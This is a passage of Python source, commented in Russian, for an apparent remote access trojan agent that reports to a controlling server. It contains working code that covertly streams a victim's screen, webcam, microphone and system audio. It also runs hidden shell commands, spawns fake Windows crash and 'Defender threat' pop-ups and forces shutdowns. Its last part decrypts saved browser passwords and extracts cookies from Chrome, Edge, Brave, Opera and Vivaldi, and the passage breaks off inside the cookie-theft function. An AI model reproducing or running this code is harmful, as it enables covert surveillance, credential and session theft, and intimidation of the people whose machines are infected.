                    mix_max = int(np.max(np.abs(mixed)))
                    _log_to_file(f"[Audio] recv() #{self._recv_count}: pts={frame.pts}, mix_max={mix_max}, samples={frame.samples}")
                    print(f"[Audio] recv() #{self._recv_count}: pts={frame.pts}, mix_max={mix_max}, samples={frame.samples}")
                return frame
            except Exception as e:
                _log_to_file(f"[Audio] recv() exception: {e}")
                print(f"[Audio] recv() exception: {e}")
                raise

        def stop(self):
            """Останавливаем аудио потоки"""
            _log_to_file("[Audio] Stopping audio track...")
            self._running = False

            # Ждем завершения потока захвата
            if hasattr(self, 'capture_thread') and self.capture_thread.is_alive():
                self.capture_thread.join(timeout=2)

            super().stop()

            if self.mic_stream:
                try:
                    self.mic_stream.stop_stream()
                    self.mic_stream.close()
                    _log_to_file("[Audio] Microphone stream closed")
                except Exception as e:
                    _log_to_file(f"[Audio] Error closing mic stream: {e}")

            if self.sys_stream:
                try:
                    self.sys_stream.stop_stream()
                    self.sys_stream.close()
                    _log_to_file("[Audio] System audio stream closed")
                except Exception as e:
                    _log_to_file(f"[Audio] Error closing sys stream: {e}")

            try:
                self.p.terminate()
                _log_to_file("[Audio] PyAudio terminated")
            except Exception as e:
                _log_to_file(f"[Audio] Error terminating PyAudio: {e}")


def start_screen_stream(agent_id, interval=0.033, monitor_index=0):
    """Запускает трансляцию экрана."""
    global screen_stream_active, screen_stream_thread, screen_stream_interval, screen_stream_monitor

    with screen_stream_lock:
        # Если уже идет стрим, сначала останавливаем его
        if screen_stream_active:
            screen_stream_active = False
            # Отпускаем блокировку на время ожидания завершения потока
            old_thread = screen_stream_thread
        else:
            old_thread = None

    # Ждем завершения старого потока вне блокировки (увеличен timeout до 5 сек)
    if old_thread and old_thread.is_alive():
        old_thread.join(timeout=5)

    # Небольшая пауза для гарантии остановки
    time.sleep(0.5)

    with screen_stream_lock:
        screen_stream_active = True
        screen_stream_interval = interval
        screen_stream_monitor = monitor_index if monitor_index is not None else 0
        screen_stream_thread = threading.Thread(
            target=screen_stream_worker,
            args=(agent_id, interval, monitor_index if monitor_index is not None else 0),
            daemon=True
        )
        screen_stream_thread.start()

    return json.dumps({"status": "streaming_started", "interval": interval, "monitor": monitor_index})


def stop_screen_stream():
    """Останавливает трансляцию экрана."""
    global screen_stream_active, screen_stream_thread

    if not screen_stream_active:
        return json.dumps({"status": "not_streaming"})

    screen_stream_active = False

    # Ждем завершения потока
    if screen_stream_thread and screen_stream_thread.is_alive():
        screen_stream_thread.join(timeout=2)

    return json.dumps({"status": "streaming_stopped"})


def webcam_stream_worker(agent_id, interval, camera_index=0):
    """Поток для трансляции веб-камеры."""
    global webcam_stream_active

    while True:
        with webcam_stream_lock:
            if not webcam_stream_active:
                break

        try:
            if cv2:
                # Захватываем кадр с веб-камеры
                cap = cv2.VideoCapture(camera_index)
                if cap.isOpened():
                    ret, frame = cap.read()
                    cap.release()

                    if ret:
                        # Конвертируем в JPEG
                        _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
                        frame_base64 = base64.b64encode(buffer).decode()

                        # Отправляем кадр
                        sio.emit('command_result', {
                            'agent_id': agent_id,
                            'command_id': None,
                            'result': json.dumps({"webcam_frame": frame_base64})
                        })
                    else:
                        _log_to_file("[!] Failed to capture webcam frame")
                else:
                    _log_to_file("[!] Cannot open webcam")
            else:
                _log_to_file("[!] cv2 not available for webcam stream")
                break

        except Exception as e:
            _log_to_file(f"[!] Webcam stream error: {e}")

        time.sleep(interval)


def start_webcam_stream(agent_id, interval=0.2, camera_index=0):
    """Запускает трансляцию веб-камеры."""
    global webcam_stream_active, webcam_stream_thread, webcam_stream_interval

    with webcam_stream_lock:
        # Если уже идет стрим, сначала останавливаем его
        if webcam_stream_active:
            webcam_stream_active = False
            old_thread = webcam_stream_thread
        else:
            old_thread = None

    # Ждем завершения старого потока
    if old_thread and old_thread.is_alive():
        old_thread.join(timeout=5)

    time.sleep(0.5)

    with webcam_stream_lock:
        webcam_stream_active = True
        webcam_stream_interval = interval
        webcam_stream_thread = threading.Thread(
            target=webcam_stream_worker,
            args=(agent_id, interval, camera_index),
            daemon=True
        )
        webcam_stream_thread.start()

    return json.dumps({"status": "webcam_streaming_started", "interval": interval, "camera": camera_index})


def stop_webcam_stream():
    """Останавливает трансляцию веб-камеры."""
    global webcam_stream_active, webcam_stream_thread

    if not webcam_stream_active:
        return json.dumps({"status": "not_streaming"})

    webcam_stream_active = False

    # Ждем завершения потока
    if webcam_stream_thread and webcam_stream_thread.is_alive():
        webcam_stream_thread.join(timeout=2)

    return json.dumps({"status": "webcam_streaming_stopped"})


def get_webcams():
    """Получает список доступных веб-камер."""
    cameras = []
    if cv2:
        # Проверяем первые 5 индексов камер
        for i in range(5):
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append({
                    'index': i,
                    'name': f'Camera {i}'
                })
                cap.release()

    return json.dumps({'cameras': cameras})


def get_audio_devices():
    """Получает список доступных аудио устройств."""
    devices = []
    if pyaudio:
        try:
            p = pyaudio.PyAudio()

            # Добавляем дефолтное устройство первым
            try:
                default_info = p.get_default_input_device_info()
                device_name = default_info['name']
                if isinstance(device_name, bytes):
                    try:
                        device_name = device_name.decode('utf-8')
                    except:
                        device_name = device_name.decode('cp1251', errors='ignore')
                devices.append({
                    'index': -1,  # Специальный индекс для дефолтного устройства
                    'name': f'Default Microphone ({device_name})'
                })
            except:
                pass

            for i in range(p.get_device_count()):
                info = p.get_device_info_by_index(i)
                if info['maxInputChannels'] > 0:  # Только устройства ввода
                    device_name = info['name']
                    # Исправляем кодировку если нужно
                    if isinstance(device_name, bytes):
                        try:
                            device_name = device_name.decode('utf-8')
                        except:
                            device_name = device_name.decode('cp1251', errors='ignore')
                    devices.append({
                        'index': i,
                        'name': device_name
                    })
            p.terminate()
        except Exception as e:
            print(f"Error getting audio devices: {e}")

    return json.dumps({'devices': devices}, ensure_ascii=False)


def microphone_stream_worker(device_index):
    """Поток для захвата и отправки аудио с микрофона."""
    global microphone_stream_active, agent_id

    print("[MICROPHONE] Worker started!")

    if not pyaudio:
        return

    try:
        p = pyaudio.PyAudio()
        CHUNK = 2048  # Больший буфер для стабильности
        FORMAT = pyaudio.paInt16
        RATE = 48000
        CHANNELS = 2

        # Получаем информацию об устройстве
        if device_index is not None and device_index != -1:
            device_info = p.get_device_info_by_index(device_index)
        else:
            device_info = p.get_default_input_device_info()
            device_index = device_info['index']

        print(f"[MICROPHONE] Config: rate={RATE}, channels={CHANNELS}, chunk={CHUNK}, device={device_index}")

        stream = p.open(
            format=FORMAT,
            channels=CHANNELS,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK,
            input_device_index=device_index
        )

        print(f"[MICROPHONE] Stream opened, starting capture")

        while microphone_stream_active:
            try:
                data = stream.read(CHUNK, exception_on_overflow=False)
                audio_b64 = base64.b64encode(data).decode('utf-8')

                sio.emit('audio_data', {
                    'agent_id': agent_id,
                    'audio': audio_b64,
                    'format': 'pcm',
                    'rate': RATE,
                    'channels': CHANNELS,
                    'source': 'microphone'
                })

            except Exception as e:
                print(f"[MICROPHONE] Error reading: {e}")
                break

        stream.stop_stream()
        stream.close()
        p.terminate()
        print("[MICROPHONE] Stream stopped")

    except Exception as e:
        print(f"[MICROPHONE] Stream error: {e}")
        microphone_stream_active = False


def system_audio_stream_worker():
    """Поток для захвата и отправки системного аудио."""
    global system_audio_stream_active, agent_id

    if not pyaudio:
        return

    try:
        p = pyaudio.PyAudio()
        CHUNK = 2048
        FORMAT = pyaudio.paInt16
        RATE = 48000
        CHANNELS = 2

        # Ищем WASAPI loopback устройство
        try:
            wasapi_info = p.get_default_wasapi_loopback()
            loopback_index = wasapi_info['index']
            device_info = wasapi_info
            print(f"[SYSTEM_AUDIO] Using WASAPI loopback: {device_info['name']}")
        except Exception as e:
            print(f"[SYSTEM_AUDIO] WASAPI loopback not available: {e}")
            loopback_index = None
            for i in range(p.get_device_count()):
                dev_info = p.get_device_info_by_index(i)
                if dev_info['maxInputChannels'] > 0:
                    name = dev_info['name'].lower()
                    if 'stereo mix' in name or 'loopback' in name or 'what u hear' in name:
                        loopback_index = i
                        device_info = dev_info
                        print(f"[SYSTEM_AUDIO] Found loopback device: {device_info['name']}")
                        break

            if loopback_index is None:
                print("[SYSTEM_AUDIO] No loopback device found")
                system_audio_stream_active = False
                return

        print(f"[SYSTEM_AUDIO] Config: rate={RATE}, channels={CHANNELS}, chunk={CHUNK}, device={loopback_index}")

        stream = p.open(
            format=FORMAT,
            channels=CHANNELS,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK,
            input_device_index=loopback_index
        )

        print(f"[SYSTEM_AUDIO] Stream opened, starting capture")

        while system_audio_stream_active:
            try:
                data = stream.read(CHUNK, exception_on_overflow=False)
                audio_b64 = base64.b64encode(data).decode('utf-8')

                sio.emit('audio_data', {
                    'agent_id': agent_id,
                    'audio': audio_b64,
                    'format': 'pcm',
                    'rate': RATE,
                    'channels': CHANNELS,
                    'source': 'system'
                })

            except Exception as e:
                print(f"[SYSTEM_AUDIO] Error reading: {e}")
                break

        stream.stop_stream()
        stream.close()
        p.terminate()
        print("[SYSTEM_AUDIO] Stream stopped")

    except Exception as e:
        print(f"[SYSTEM_AUDIO] Stream error: {e}")
        system_audio_stream_active = False


def mixed_audio_stream_worker(mic_device_index):
    """Поток для захвата и микширования микрофона и системного аудио."""
    global microphone_stream_active, system_audio_stream_active, agent_id

    if not pyaudio:
        return

    import numpy as np

    try:
        p = pyaudio.PyAudio()
        CHUNK = 2048
        FORMAT = pyaudio.paInt16
        TARGET_RATE = 48000
        TARGET_CHANNELS = 2

        # Настройка микрофона
        if mic_device_index is not None and mic_device_index != -1:
            mic_device_info = p.get_device_info_by_index(mic_device_index)
        else:
            mic_device_info = p.get_default_input_device_info()
            mic_device_index = mic_device_info['index']

        MIC_CHANNELS = min(2, int(mic_device_info['maxInputChannels']))

        # Настройка системного аудио (loopback)
        sys_stream = None
        loopback_index = None
        try:
            wasapi_info = p.get_default_wasapi_loopback()
            loopback_index = wasapi_info['index']
            sys_device_info = wasapi_info
        except:
            loopback_index = None
            for i in range(p.get_device_count()):
                dev_info = p.get_device_info_by_index(i)
                if dev_info['maxInputChannels'] > 0:
                    name = dev_info['name'].lower()
                    if 'stereo mix' in name or 'loopback' in name or 'what u hear' in name:
                        loopback_index = i
                        sys_device_info = dev_info
                        break

        if loopback_index is None:
            print("[MIXED_AUDIO] No loopback device, using mic only")
            system_audio_stream_active = False

        SYS_CHANNELS = min(2, int(sys_device_info['maxInputChannels'])) if loopback_index else TARGET_CHANNELS

        print(f"[MIXED_AUDIO] Config: rate={TARGET_RATE}, chunk={CHUNK}")
        print(f"[MIXED_AUDIO] Mic channels: {MIC_CHANNELS}, Sys channels: {SYS_CHANNELS}")

        # Открываем оба потока
        mic_stream = p.open(
            format=FORMAT,
            channels=MIC_CHANNELS,
            rate=TARGET_RATE,
            input=True,
            frames_per_buffer=CHUNK,
            input_device_index=mic_device_index
        )

        if loopback_index and system_audio_stream_active:
            sys_stream = p.open(
                format=FORMAT,
                channels=SYS_CHANNELS,
                rate=TARGET_RATE,
                input=True,
                frames_per_buffer=CHUNK,
                input_device_index=loopback_index
            )

        print("[MIXED_AUDIO] Streams opened, starting capture")

        while microphone_stream_active or system_audio_stream_active:
            try:
                mic_array = None
                sys_array = None

                # Читаем микрофон
                if microphone_stream_active:
                    try:
                        mic_data = mic_stream.read(CHUNK, exception_on_overflow=False)
                        mic_array = np.frombuffer(mic_data, dtype=np.int16)
                        if MIC_CHANNELS == 1:
                            mic_array = np.repeat(mic_array, 2)
                    except Exception as e:
                        print(f"[MIXED_AUDIO] Mic read error: {e}")

                # Читаем системное аудио
                if system_audio_stream_active and sys_stream:
                    try:
                        sys_data = sys_stream.read(CHUNK, exception_on_overflow=False)
                        sys_array = np.frombuffer(sys_data, dtype=np.int16)
                        if SYS_CHANNELS == 1:
                            sys_array = np.repeat(sys_array, 2)
                    except Exception as e:
                        print(f"[MIXED_AUDIO] Sys read error: {e}")

                # Микшируем
                if mic_array is not None and sys_array is not None:
                    min_len = min(len(mic_array), len(sys_array))
                    mixed = (mic_array[:min_len].astype(np.int32) + sys_array[:min_len].astype(np.int32)) // 2
                    mixed = mixed.astype(np.int16)
                elif mic_array is not None:
                    mixed = mic_array
                elif sys_array is not None:
                    mixed = sys_array
                else:
                    continue

                # Отправляем
                mixed_bytes = mixed.tobytes()
                audio_b64 = base64.b64encode(mixed_bytes).decode('utf-8')

                sio.emit('audio_data', {
                    'agent_id': agent_id,
                    'audio': audio_b64,
                    'format': 'pcm',
                    'rate': TARGET_RATE,
                    'channels': TARGET_CHANNELS,
                    'source': 'mixed'
                })

            except Exception as e:
                print(f"[MIXED_AUDIO] Loop error: {e}")
                break

        mic_stream.stop_stream()
        mic_stream.close()
        if sys_stream:
            sys_stream.stop_stream()
            sys_stream.close()
        p.terminate()
        print("[MIXED_AUDIO] Streams stopped")

    except Exception as e:
        print(f"[MIXED_AUDIO] Stream error: {e}")
        microphone_stream_active = False
        system_audio_stream_active = False


def start_microphone_stream(device_index=None):
    """Запускает стрим микрофона."""
    global microphone_stream_active, microphone_stream_thread, microphone_device_index, system_audio_stream_active, system_audio_stream_thread

    print(f"[DEBUG] start_microphone_stream called with device_index={device_index}")

    with microphone_stream_lock:
        if microphone_stream_active:
            print("[DEBUG] Already streaming, returning")
            return json.dumps({"status": "already_streaming"})

        microphone_stream_active = True
        microphone_device_index = device_index

        # Если системное аудио уже активно, останавливаем его поток и запускаем микшированный
        if system_audio_stream_active and system_audio_stream_thread:
            print("[DEBUG] System audio active, stopping its thread and starting mixed stream")

            # Останавливаем только поток, НЕ меняя флаг
            old_thread = system_audio_stream_thread
            system_audio_stream_thread = None

            # Ждем завершения старого потока
            if old_thread and old_thread.is_alive():
                # Временно выключаем флаг только для остановки потока
                temp_flag = system_audio_stream_active
                system_audio_stream_active = False
                old_thread.join(timeout=1)
                # Сразу восстанавливаем флаг ДО запуска нового потока
                system_audio_stream_active = temp_flag

            # Запускаем микшированный поток с обоими флагами активными
            mixed_thread = threading.Thread(
                target=mixed_audio_stream_worker,
                args=(device_index,),
                daemon=True
            )
            mixed_thread.start()
            microphone_stream_thread = mixed_thread
            system_audio_stream_thread = mixed_thread
        else:
            # Только микрофон
            print("[DEBUG] Starting microphone only")
            microphone_stream_thread = threading.Thread(
                target=microphone_stream_worker,
                args=(device_index,),
                daemon=True
            )
            microphone_stream_thread.start()

    return json.dumps({"status": "microphone_stream_started"})


def stop_microphone_stream():
    """Останавливает стрим микрофона."""
    global microphone_stream_active

    with microphone_stream_lock:
        if not microphone_stream_active:
            return json.dumps({"status": "not_streaming"})

        microphone_stream_active = False

        if microphone_stream_thread:
            microphone_stream_thread.join(timeout=2)

    return json.dumps({"status": "microphone_stream_stopped"})


def start_system_audio_stream():
    """Запускает стрим системного аудио."""
    global system_audio_stream_active, system_audio_stream_thread, microphone_stream_active, microphone_stream_thread, microphone_device_index

    with system_audio_stream_lock:
        if system_audio_stream_active:
            return json.dumps({"status": "already_streaming"})

        system_audio_stream_active = True

        # Если микрофон уже активен, останавливаем его поток и запускаем микшированный
        if microphone_stream_active and microphone_stream_thread:
            print("[SYSTEM_AUDIO] Microphone active, stopping its thread and starting mixed stream")

            # Останавливаем только поток, НЕ меняя флаг
            old_thread = microphone_stream_thread
            microphone_stream_thread = None

            # Ждем завершения старого потока
            if old_thread and old_thread.is_alive():
                # Временно выключаем флаг только для остановки потока
                temp_flag = microphone_stream_active
                microphone_stream_active = False
                old_thread.join(timeout=1)
                # Сразу восстанавливаем флаг ДО запуска нового потока
                microphone_stream_active = temp_flag

            # Запускаем микшированный поток с обоими флагами активными
            mixed_thread = threading.Thread(
                target=mixed_audio_stream_worker,
                args=(microphone_device_index,),
                daemon=True
            )
            mixed_thread.start()
            microphone_stream_thread = mixed_thread
            system_audio_stream_thread = mixed_thread
        else:
            # Только системное аудио
            print("[SYSTEM_AUDIO] Starting system audio only")
            system_audio_stream_thread = threading.Thread(
                target=system_audio_stream_worker,
                daemon=True
            )
            system_audio_stream_thread.start()

    return json.dumps({"status": "system_audio_stream_started"})


def stop_system_audio_stream():
    """Останавливает стрим системного аудио."""
    global system_audio_stream_active

    with system_audio_stream_lock:
        if not system_audio_stream_active:
            return json.dumps({"status": "not_streaming"})

        system_audio_stream_active = False

        if system_audio_stream_thread:
            system_audio_stream_thread.join(timeout=2)

    return json.dumps({"status": "system_audio_stream_stopped"})


def spam_errors(count=10, delay=0.5, error_type='critical'):
    """Спамит системные ошибки Windows."""
    import ctypes
    import threading
    from ctypes import wintypes

    # Константы Windows
    MB_ICONERROR = 0x10
    MB_ICONWARNING = 0x30
    MB_SYSTEMMODAL = 0x1000
    MB_TOPMOST = 0x00040000

    WS_EX_TOOLWINDOW = 0x00000080  # Скрывает окно с панели задач
    WS_POPUP = 0x80000000

    # Системные ошибки Windows
    error_messages = [
        ("Critical Error", "A critical error has occurred and the program needs to close.\n\nError Code: 0xC0000005"),
        ("System Error", "The system has detected a problem and needs to restart.\n\nError Code: 0x0000007B"),
        ("Application Error", "The application was unable to start correctly (0xc000007b).\n\nClick OK to close the application."),
        ("Windows Error", "Windows has encountered a problem and needs to close.\n\nWe are sorry for the inconvenience."),
        ("Memory Error", "The instruction at 0x00000000 referenced memory at 0x00000000.\n\nThe memory could not be read."),
        ("Disk Error", "Windows detected a hard disk problem.\n\nBack up your files immediately to prevent information loss."),
        ("Driver Error", "A device driver has caused a problem and Windows has been shut down to prevent damage."),
        ("Security Alert", "Windows Defender has detected a threat on your computer.\n\nImmediate action required."),
        ("Update Error", "Windows Update has encountered an error and cannot continue.\n\nError Code: 0x80070002"),
        ("System Failure", "STOP: 0x0000007E SYSTEM_THREAD_EXCEPTION_NOT_HANDLED\n\nA fatal system error has occurred.")
    ]

    icon_type = (MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST) if error_type == 'critical' else (MB_ICONWARNING | MB_SYSTEMMODAL | MB_TOPMOST)

    def show_error(title, message):
        try:
            user32 = ctypes.windll.user32

            # Создаем невидимое окно-владелец с WS_EX_TOOLWINDOW
            # Это окно не будет показываться на панели задач
            hwnd_owner = user32.CreateWindowExW(
                WS_EX_TOOLWINDOW,  # Extended style - скрывает с панели задач
                "STATIC",          # Class name
                "",                # Window name
                WS_POPUP,          # Style
                0, 0, 0, 0,        # Position and size
                None,              # Parent
                None,              # Menu
                None,              # Instance
                None               # Param
            )

            # Показываем MessageBox с невидимым окном-владельцем
            user32.MessageBoxW(hwnd_owner, message, title, icon_type)

            # Уничтожаем невидимое окно после закрытия MessageBox
            if hwnd_owner:
                user32.DestroyWindow(hwnd_owner)
        except:
            pass

    # Показываем ошибки в отдельных потоках
    threads = []
    for i in range(min(count, len(error_messages))):
        title, message = error_messages[i % len(error_messages)]
        t = threading.Thread(target=show_error, args=(title, message), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(delay)

    return json.dumps({"status": "errors_spawned", "count": count})


def spam_errors_custom(count, title, message, delay=0.3):
    """Спамит кастомные системные ошибки Windows."""
    import ctypes
    import threading
    from ctypes import wintypes

    # Константы Windows
    MB_ICONERROR = 0x10
    MB_SYSTEMMODAL = 0x1000
    MB_TOPMOST = 0x00040000
    WS_EX_TOOLWINDOW = 0x00000080
    WS_POPUP = 0x80000000

    icon_type = MB_ICONERROR | MB_SYSTEMMODAL | MB_TOPMOST

    def show_error():
        try:
            user32 = ctypes.windll.user32

            # Создаем невидимое окно-владелец с WS_EX_TOOLWINDOW
            hwnd_owner = user32.CreateWindowExW(
                WS_EX_TOOLWINDOW,
                "STATIC",
                "",
                WS_POPUP,
                0, 0, 0, 0,
                None, None, None, None
            )

            # Показываем MessageBox с кастомным текстом
            user32.MessageBoxW(hwnd_owner, message, title, icon_type)

            # Уничтожаем невидимое окно
            if hwnd_owner:
                user32.DestroyWindow(hwnd_owner)
        except:
            pass

    # Показываем ошибки в отдельных потоках
    threads = []
    for i in range(count):
        t = threading.Thread(target=show_error, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(delay)

    return json.dumps({"status": "custom_errors_spawned", "count": count, "title": title})


def set_wallpaper(image_path, style="fill"):
    """Устанавливает обои рабочего стола Windows."""
    if platform.system() != "Windows":
        return False
    
    try:
        image_path = os.path.abspath(image_path)
        
        if not os.path.exists(image_path):
            return False
        
        wallpaper_styles = {
            "fill": "10", "fit": "6", "stretch": "2",
            "tile": "0", "center": "0", "span": "22"
        }
        
        style_value = wallpaper_styles.get(style.lower(), "10")
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, style_value)
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "1" if style.lower() == "tile" else "0")
        winreg.CloseKey(key)
        
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDWININICHANGE = 0x02
        
        result = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
        )
        return bool(result)
            
    except Exception:
        return False


def get_windows_console_encoding():
    """Определяет правильную кодировку для Windows консоли."""
    if platform.system() != "Windows":
        return 'utf-8'
    try:
        cp = ctypes.windll.kernel32.GetConsoleOutputCP()
        codepage_map = {866: 'cp866', 1251: 'cp1251', 1252: 'cp1252', 65001: 'utf-8'}
        return codepage_map.get(cp, f'cp{cp}')
    except:
        return 'cp866'


def execute_shell_command(command, timeout=30):
    """Выполняет команду с правильной обработкой кодировки."""
    if platform.system() == "Windows":
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = subprocess.SW_HIDE
        
        encoding = get_windows_console_encoding()
        
        result = subprocess.run(
            command, shell=True, capture_output=True, timeout=timeout, startupinfo=si,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        output = ""
        encodings = [encoding, 'cp866', 'cp1251', 'utf-8', 'cp1252', 'latin-1']
        
        for enc in encodings:
            try:
                stdout = result.stdout.decode(enc, errors='strict')
                stderr = result.stderr.decode(enc, errors='strict')
                if stdout and not all(c == '�' for c in stdout.strip()):
                    output = stdout + stderr
                    break
            except:
                continue
        
        if not output:
            output = result.stdout.decode('cp866', errors='ignore') + \
                     result.stderr.decode('cp866', errors='ignore')
        
        return output or "No output"
    else:
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True,
            timeout=timeout, encoding='utf-8', errors='replace'
        )
        return result.stdout + result.stderr or "No output"


def execute_power_action(action, delay, force, message):
    """Выполняет системные операции с питанием."""
    if platform.system() != "Windows":
        return False
    
    try:
        def execute_delayed():
            if delay > 0:
                time.sleep(delay)
            
            if action == "shutdown":
                os.system(f"shutdown /s {'/f' if force else ''} /t 0")
            elif action in ["reboot", "restart"]:
                os.system(f"shutdown /r {'/f' if force else ''} /t 0")
            elif action == "hibernate":
                os.system("shutdown /h")
            elif action == "lock":
                ctypes.windll.user32.LockWorkStation()
        
        threading.Thread(target=execute_delayed, daemon=True).start()
        return True
        
    except Exception:
        return False


def get_chrome_datetime(chromedate):
    """Конвертирует Chrome timestamp в читаемую дату."""
    if chromedate and chromedate != 86400000000 and chromedate > 0:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except:
            pass
    return "N/A"


def get_encryption_key(browser_path):
    """Извлекает ключ шифрования из Local State файла браузера."""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        
        if not os.path.exists(local_state_path):
            return None
        
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state_data = json.load(f)
        
        if "os_crypt" not in local_state_data:
            return None
        
        if "encrypted_key" not in local_state_data["os_crypt"]:
            return None
        
        encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
        encrypted_key = base64.b64decode(encrypted_key)
        encrypted_key = encrypted_key[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        return decrypted_key
        
    except Exception:
        return None


def decrypt_password(password, key):
    """Расшифровывает пароль Chrome/Edge."""
    try:
        if not password or len(password) < 3:
            return ""
        
        version = password[:3]
        
        if version == b'v10' or version == b'v11':
            try:
                nonce = password[3:15]
                ciphertext = password[15:-16]
                tag = password[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                
                return decrypted.decode('utf-8', errors='ignore')
            except Exception:
                try:
                    nonce = password[3:15]
                    ciphertext = password[15:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    decrypted = cipher.decrypt(ciphertext)
                    decrypted = decrypted[:-16] if len(decrypted) > 16 else decrypted
                    
                    return decrypted.decode('utf-8', errors='ignore')
                except:
                    pass
        else:
            try:
                decrypted = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                return decrypted.decode('utf-8', errors='ignore')
            except:
                pass
        
        return ""
        
    except Exception:
        return ""


def get_browser_profiles(browser_path):
    """Находит все профили браузера."""
    profiles = []
    
    try:
        if not os.path.exists(browser_path):
            return profiles
        
        default_path = os.path.join(browser_path, "Default", "Login Data")
        if os.path.exists(default_path):
            profiles.append("Default")
        
        for i in range(1, 20):
            profile_name = f"Profile {i}"
            profile_path = os.path.join(browser_path, profile_name, "Login Data")
            if os.path.exists(profile_path):
                profiles.append(profile_name)
        
        guest_path = os.path.join(browser_path, "Guest Profile", "Login Data")
        if os.path.exists(guest_path):
            profiles.append("Guest Profile")
        
        system_path = os.path.join(browser_path, "System Profile", "Login Data")
        if os.path.exists(system_path):
            profiles.append("System Profile")
            
    except:
        pass
    
    return profiles


def extract_chromium_credentials():
    """Извлекает сохранённые пароли из всех Chromium браузеров."""
    credentials = []
    
    browsers = [
        ("Chrome", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Google", "Chrome", "User Data")),
        ("Chrome Beta", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Google", "Chrome Beta", "User Data")),
        ("Edge", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")),
        ("Opera", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Roaming", "Opera Software", "Opera Stable")),
        ("Vivaldi", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Vivaldi", "User Data")),
    ]
    
    for browser_name, browser_path in browsers:
        try:
            if not os.path.exists(browser_path):
                continue
            
            key = get_encryption_key(browser_path)
            
            if not key:
                continue
            
            profiles = get_browser_profiles(browser_path)
            
            if not profiles:
                if "Opera" in browser_name:
                    login_data_path = os.path.join(browser_path, "Login Data")
                    if os.path.exists(login_data_path):
                        profiles = [""]
                else:
                    continue
            
            for profile in profiles:
                try:
                    if profile:
                        db_path = os.path.join(browser_path, profile, "Login Data")
                    else:
                        db_path = os.path.join(browser_path, "Login Data")
                    
                    if not os.path.exists(db_path):
                        continue
                    
                    temp_db = os.path.join(os.environ.get('TEMP', '.'), f"login_temp_{os.getpid()}_{browser_name}_{profile.replace(' ', '_')}.db")
                    
                    try:
                        shutil.copy2(db_path, temp_db)
                    except:
                        continue
                    
                    _TempFileTracker.add(temp_db)

                    conn = None
                    try:
                        conn = sqlite3.connect(temp_db)
                        conn.text_factory = lambda x: x.decode('utf-8', errors='ignore')
                        cursor = conn.cursor()

                        cursor.execute("""
                            SELECT origin_url, action_url, username_value, password_value,
                                   date_created, date_last_used, date_password_modified
                            FROM logins
                            WHERE password_value != ''
                        """)

                        rows = cursor.fetchall()

                        for row in rows:
                            try:
                                origin_url = row[0] or ""
                                action_url = row[1] or ""
                                username = row[2] or ""
                                password_encrypted = row[3]
                                date_created = row[4]
                                date_last_used = row[5]

                                if not password_encrypted:
                                    continue

                                password = decrypt_password(password_encrypted, key)

                                if not password:
                                    continue

                                credentials.append({
                                    "browser": browser_name,
                                    "profile": profile or "Default",
                                    "url": origin_url or action_url,
                                    "username": username,
                                    "password": password,
                                    "created": str(get_chrome_datetime(date_created)),
                                    "last_used": str(get_chrome_datetime(date_last_used)),
                                })

                            except Exception:
                                continue

                    except Exception:
                        pass
                    finally:
                        if conn:
                            try:
                                conn.close()
                            except:
                                pass
                    
                    _TempFileTracker.remove(temp_db)
                    
                except Exception:
                    continue
                    
        except Exception:
            continue
    
    return credentials


def extract_chromium_cookies():
    """Извлекает cookies из всех Chromium браузеров."""
    cookies = []
    
    browsers = [
        ("Chrome", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(os.environ.get("USERPROFILE", ""), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")),
    ]
    
    for browser_name, browser_path in browsers:
        try:
            if not os.path.exists(browser_path):
                continue
            
            key = get_encryption_key(browser_path)
            if not key:
                continue
            
            profiles = get_browser_profiles(browser_path)
            if not profiles:
                profiles = ["Default"]
            
            for profile in profiles:
                try:
                    cookies_paths = [
                        os.path.join(browser_path, profile, "Network", "Cookies"),
                        os.path.join(browser_path, profile, "Cookies"),
                    ]
                    
                    db_path = None
                    for cp in cookies_paths:
                        if os.path.exists(cp):
                            db_path = cp
                            break
                    
                    if not db_path:
                        continue
                    
                    temp_db = os.path.join(os.environ.get('TEMP', '.'), f"cookies_temp_{os.getpid()}.db")
                    
